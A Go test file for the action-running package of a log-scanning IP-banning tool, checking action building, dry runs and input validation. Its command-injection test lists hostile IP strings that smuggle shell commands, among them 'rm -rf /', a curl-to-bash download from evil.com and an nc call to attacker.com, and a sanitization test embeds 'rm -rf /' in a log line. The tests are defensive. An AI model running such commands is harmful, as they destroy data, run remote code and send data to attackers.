package actions

import (
	"testing"

	"github.com/penguinpowernz/scanban/pkg/scan"
	"github.com/stretchr/testify/assert"
)

func TestBuildActions(t *testing.T) {
	// Test BuildActions with a sample map of actions
	actionMap := map[string]string{
		"test1": "echo test1",
		"test2": "echo test2",
	}

	actions := BuildActions(actionMap, true)

	assert.Len(t, actions, 2, "BuildActions should create correct number of actions")
	assert.Equal(t, "test1", actions[0].name, "First action name should match")
	assert.Equal(t, "test2", actions[1].name, "Second action name should match")
}

func TestActionHandle(t *testing.T) {
	// Test single action handling
	action := &Action{
		name:    "test",
		command: "echo $ip",
	}

	// Successful context
	ctx := &scan.Context{
		IP:     "192.168.1.1",
		Action: "test",
		DryRun: true,
	}

	action.Handle(ctx)
	assert.True(t, ctx.Actioned, "Context should be marked as actioned")

	// Context with mismatched action
	ctx2 := &scan.Context{
		IP:     "192.168.1.1",
		Action: "other",
		DryRun: true,
	}

	action.Handle(ctx2)
	assert.False(t, ctx2.Actioned, "Context should not be marked as actioned")
}

func TestActionsHandle(t *testing.T) {
	// Create multiple actions
	actions := Actions{
		&Action{name: "test1", command: "echo test1"},
		&Action{name: "test2", command: "echo test2"},
	}

	// Successful context with multiple actions
	ctx := &scan.Context{
		IP:     "192.168.1.1",
		Action: "test1,test2",
		DryRun: true,
	}

	actions.Handle(ctx)
	assert.True(t, ctx.Actioned, "Context should be marked as actioned")
}

func TestActionDryRun(t *testing.T) {
	// Test dry run behavior
	action := &Action{
		name:    "test",
		command: "echo $ip",
	}

	ctx := &scan.Context{
		IP:     "192.168.1.1",
		Action: "test",
		DryRun: true,
	}

	err := action.execute(ctx)
	assert.NoError(t, err, "Dry run should not produce an error")
}

func TestActionNoAction(t *testing.T) {
	// Test context with no action
	action := &Action{
		name:    "test",
		command: "echo $ip",
	}

	ctx := &scan.Context{
		IP:     "192.168.1.1",
		Action: "",
		DryRun: true,
	}

	action.Handle(ctx)
	assert.False(t, ctx.Actioned, "Context should not be marked as actioned")
}

// TestCommandInjectionPrevention verifies that malicious IPs cannot inject commands
func TestCommandInjectionPrevention(t *testing.T) {
	maliciousIPs := []string{
		"192.168.1.1; rm -rf /",
		"192.168.1.1 && curl http://evil.com/malware.sh | bash",
		"192.168.1.1 | nc attacker.com 1234",
		"192.168.1.1`whoami`",
		"192.168.1.1$(whoami)",
		"192.168.1.1 > /etc/passwd",
		"192.168.1.1(); echo pwned",
		"192.168.1.1{}[]",
	}

	action := &Action{
		name:    "test",
		command: "echo 'banning $ip'",
	}

	for _, maliciousIP := range maliciousIPs {
		t.Run(maliciousIP, func(t *testing.T) {
			ctx := &scan.Context{
				IP:     maliciousIP,
				Action: "test",
				DryRun: false, // Test actual execution path
			}

			err := action.execute(ctx)
			// Should return error for invalid IP
			assert.Error(t, err, "Expected error for malicious IP: %s", maliciousIP)
			assert.Contains(t, err.Error(), "invalid or dangerous IP address")
		})
	}
}

// TestValidIPExecution verifies that valid IPs can still execute actions
func TestValidIPExecution(t *testing.T) {
	validIPs := []string{
		"192.168.1.1",
		"10.0.0.1",
		"172.16.0.1",
		"8.8.8.8",
		"2001:db8::1",
		"::1",
	}

	action := &Action{
		name:    "test",
		command: "true", // Command that always succeeds
	}

	for _, validIP := range validIPs {
		t.Run(validIP, func(t *testing.T) {
			ctx := &scan.Context{
				IP:          validIP,
				Action:      "test",
				DryRun:      false,
				Line:        "test log line",
				Filename:    "/var/log/test.log",
				UnbanAction: "unban-test",
				BanTime:     24,
			}

			err := action.execute(ctx)
			// Should succeed for valid IP
			assert.NoError(t, err, "Expected no error for valid IP: %s", validIP)
		})
	}
}

// TestEnvironmentVariableSanitization verifies env vars are sanitized
func TestEnvironmentVariableSanitization(t *testing.T) {
	action := &Action{
		name:    "test",
		command: "printenv SB_LINE",
	}

	maliciousLine := "test line\nrm -rf /\x00evil"

	ctx := &scan.Context{
		IP:          "192.168.1.1",
		Action:      "test",
		DryRun:      false,
		Line:        maliciousLine,
		Filename:    "/var/log/test.log",
		UnbanAction: "test",
		BanTime:     24,
	}

	// Should execute without error (sanitization removes dangerous chars)
	err := action.execute(ctx)
	assert.NoError(t, err)
	// The malicious newline and null byte should have been removed by sanitization
}
